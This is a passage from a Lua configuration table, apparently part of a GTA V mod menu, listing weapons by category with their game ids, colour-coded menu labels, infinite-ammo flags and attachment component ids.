            }
        },
        CombatPDW = {
            id = 'weapon_combatpdw',
            name = '~h~~r~> ~s~Combat PDW',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MachinePistol = {
            id = 'weapon_machinepistol',
            name = '~h~~r~> ~s~Machine Pistol ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        MiniSMG = {
            id = 'weapon_minismg',
            name = '~h~~r~> ~s~Mini SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_02'
                    }
                }
            }
        },
        UnholyHellbringer = {
            id = 'weapon_raycarbine',
            name = '~h~~r~> ~s~Unholy Hellbringer',
            bInfAmmo = false,
            mods = {}
        }
    },
    Shotguns = {
        PumpShotgun = {
            id = 'weapon_pumpshotgun',
            name = '~h~~r~> ~s~Pump Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        'name = Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP'
                    }
                }
            }
        },
        PumpShotgunMkII = {
            id = 'weapon_pumpshotgun_mk2',
            name = '~h~~r~> ~s~Pump Shotgun Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Dragon Breath Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Steel Buckshot Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~Flechette Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~Explosive Slugs',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~r~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    }
                }
            }
        },
        SawedOffShotgun = {
            id = 'weapon_sawnoffshotgun',
            name = '~h~~r~> ~s~Sawed-Off Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        AssaultShotgun = {
            id = 'weapon_assaultshotgun',
            name = '~h~~r~> ~s~Assault Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupShotgun = {
            id = 'weapon_bullpupshotgun',
            name = '~h~~r~> ~s~Bullpup Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        Musket = {
            id = 'weapon_musket',
            name = '~h~~r~> ~s~Musket',
            bInfAmmo = false,
            mods = {}
        },
        HeavyShotgun = {
            id = 'weapon_heavyshotgun',
            name = '~h~~r~> ~s~Heavy Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        DoubleBarrelShotgun = {
            id = 'weapon_dbshotgun',
            name = '~h~~r~> ~s~Double Barrel Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {
            id = 'weapon_autoshotgun',
            name = '~h~~r~> ~s~Sweeper Shotgun',
            bInfAmmo = false,
            mods = {}
        }
    },
    AssaultRifles = {
        AssaultRifle = {
            id = 'weapon_assaultrifle',
            name = '~h~~r~> ~s~Assault Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        AssaultRifleMkII = {
            id = 'weapon_assaultrifle_mk2',
            name = '~h~~r~> ~s~Assault Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_AR_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_AR_BARREL_0'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        CarbineRifle = {
            id = 'weapon_carbinerifle',
            name = '~h~~r~> ~s~Carbine Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Box Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CarbineRifleMkII = {
            id = 'weapon_carbinerifle_mk2',
            name = '~h~~r~> ~s~Carbine Rifle Mk II ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_CR_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_CR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        AdvancedRifle = {
            id = 'weapon_advancedrifle',
            name = '~h~~r~> ~s~Advanced Rifle ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                }
            }
        },
        SpecialCarbine = {
            id = 'weapon_specialcarbine',
            name = '~h~~r~> ~s~Special Carbine',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        SpecialCarbineMkII = {
            id = 'weapon_specialcarbine_mk2',
            name = '~h~~r~> ~s~Special Carbine Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SC_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SC_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        BullpupRifle = {
            id = 'weapon_bullpuprifle',
            name = '~h~~r~> ~s~Bullpup Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupRifleMkII = {
            id = 'weapon_bullpuprifle_mk2',
            name = '~h~~r~> ~s~Bullpup Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_BP_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_BP_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CompactRifle = {
            id = 'weapon_compactrifle',
            name = '~h~~r~> ~s~Compact Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
                    }
                }
            }
        }
    },
    LMG = {
        MG = {
            id = 'weapon_mg',
            name = '~h~~r~> ~s~MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_02'
                    }
                }
            }
        },
        CombatMG = {
            id = 'weapon_combatmg',
            name = '~h~~r~> ~s~Combat MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CombatMGMkII = {
            id = 'weapon_combatmg_mk2',
            name = '~h~~r~> ~s~Combat MG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_MG_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_MG_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        GusenbergSweeper = {
            id = 'weapon_gusenberg',
            name = '~h~~r~> ~s~GusenbergSweeper',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_02'
                    }
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = 'weapon_sniperrifle',
            name = '~h~~r~> ~s~Sniper Rifle',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
